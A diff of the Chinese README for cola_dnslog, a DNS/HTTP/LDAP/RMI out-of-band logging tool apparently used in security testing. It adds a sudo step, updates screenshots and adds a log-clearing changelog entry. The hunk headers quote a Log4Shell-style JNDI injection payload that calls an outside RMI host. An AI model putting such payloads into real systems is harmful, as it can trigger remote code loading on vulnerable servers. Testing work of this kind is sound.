@@ -223,11 +223,11 @@ chmod +x start_webserver
 
 
 
-##### **第三步 启动logserver**
+##### **第三步 启动logserver**(需要root权限)
 
 ```sh
 chmod +x start_logserver
-./start_logserver
+sudo ./start_logserver
 ```
 
 ![image-20220730160132103](readme_resource/image-20220730160132103.png)
@@ -357,25 +357,25 @@ ${jndi:rmi://1.1.1.1:1099/rmiqrq}
 
 ### Dnslog
 
-![image-20220730151604227](readme_resource/image-20220730151604227.png)
+![image-20230204200108337](readme_resource/image-20230204200108337.png)
 
 
 
 ### Httplog
 
-![image-20220730151741311](readme_resource/image-20220730151741311.png)
+![image-20230204200455783](readme_resource/image-20230204200455783.png)
 
 
 
 ### Ldaplog
 
-![image-20220730151826344](readme_resource/image-20220730151826344.png)
+![image-20230204201704004](readme_resource/image-20230204201704004.png)
 
 
 
 ### Rmilog
 
-![image-20220730151921478](readme_resource/image-20220730151921478.png)
+![image-20230204201750497](readme_resource/image-20230204201750497.png)
 
 
 
@@ -401,6 +401,7 @@ ${jndi:rmi://1.1.1.1:1099/rmiqrq}
   1. 修改默认解析记录，domain[.]com和*[.]domain[.]com的A记录查询指向127.0.0.1，增加`md5(serverip)`[.]admin[.]domain[.]com作为域名访问的入口
   2. 修复问题：logserver报错崩溃`Segmentation fault` [issues19](https://github.com/AbelChe/cola_dnslog/issues/19)
   4. 修改默认的docker前端部署方式（无需用户编译）
+  4. 增加清除日志功能
 - 2022-08-12 v1.3.1
   1. 修复docker部署方式dns端口冲突问题
 - 2022-08-12 v1.3.0
